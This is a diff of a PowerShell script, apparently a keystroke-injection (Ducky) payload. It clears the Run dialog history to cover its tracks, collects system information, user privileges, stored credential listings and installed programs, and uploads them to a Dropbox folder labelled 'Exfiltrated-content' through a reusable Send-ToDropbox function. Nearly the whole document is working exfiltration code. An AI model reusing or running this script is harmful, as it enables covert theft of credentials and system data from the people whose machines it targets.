@@ -1,6 +1,49 @@
-#Replace <APP_KEY> with the actual "App Key" of your app.
-#Replace <APP_SECRET> with the actual "App Secret" of your app.
-#Replace <REFRESH_TOKEN> with the actual "Refresh Token" of your app.
+$REFRESH_TOKEN = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+$APP_KEY = "XXXXXXXXXXXXXXX"
+$APP_SECRET = "XXXXXXXXXXXXXXX"
 
+function Send-ToDropbox {
+    #Documentation: https://github.com/PlumpyTurkey/Ducky-Utilities/tree/main/PowerShell-Functions/Send-ToDropbox
 
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force; Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method POST -Headers @{"Authorization" = "Bearer $((Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method POST -Headers @{"Content-Type" = "application/x-www-form-urlencoded"} -Body @{grant_type = "refresh_token"; refresh_token = "<REFRESH_TOKEN>"; client_id = "<APP_KEY>"; client_secret = "<APP_SECRET>"}).access_token)"; "Content-Type" = "application/octet-stream"; "Dropbox-API-Arg" = '{ "path": "/reports/' + $env:computername + '.txt", "mode": "add", "autorename": true, "mute": false }'} -Body "# System Information #`n $(SYSTEMINFO | Out-String) `n# User Information #`n $(WHOAMI /ALL | Out-String) `n# Stored Credentials #`n $(CMDKEY /LIST | Out-String) `n# Installed Programs #`n $(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)" | Out-Null
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$RefreshToken,
+        [Parameter(Mandatory = $true)]
+        [string]$AppKey,
+        [Parameter(Mandatory = $true)]
+        [string]$AppSecret,
+        [Parameter(Mandatory = $true)]
+        [string]$Content,
+        [string]$OutputFolder = "Exfiltrated-content",
+        [string]$OutputFile = "[${env:COMPUTERNAME}-${env:USERNAME}].txt"
+    )
+    
+    try {
+        $AccessToken = (Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method Post -Headers @{
+                "Content-Type" = "application/x-www-form-urlencoded"
+            } -Body @{
+                "grant_type" = "refresh_token"
+                "refresh_token" = $RefreshToken
+                "client_id" = $AppKey
+                "client_secret" = $AppSecret
+            }).access_token
+        Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers @{
+            "Authorization" = "Bearer $AccessToken"
+            "Content-Type" = "application/octet-stream"
+            "Dropbox-API-Arg" = "{""path"":""/$OutputFolder/$OutputFile"",""mode"":""add"",""autorename"":true,""mute"":false}"
+        } -Body $Content | Out-Null
+    }
+    catch {
+        Write-Host "An error occurred: $_"
+    }
+}
+
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
+
+$Report = "*** System Information ***`n $(SYSTEMINFO | Out-String)`n"
+$Report += "*** User Information ***`n $(WHOAMI /ALL | Out-String)`n"
+$Report += "*** Stored Credentials ***`n $(CMDKEY /LIST | Out-String)`n"
+$Report += "*** Installed Programs ***`n $(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)"
+
+Send-ToDropbox -RefreshToken $REFRESH_TOKEN -AppKey $APP_KEY -AppSecret $APP_SECRET -Content $Report
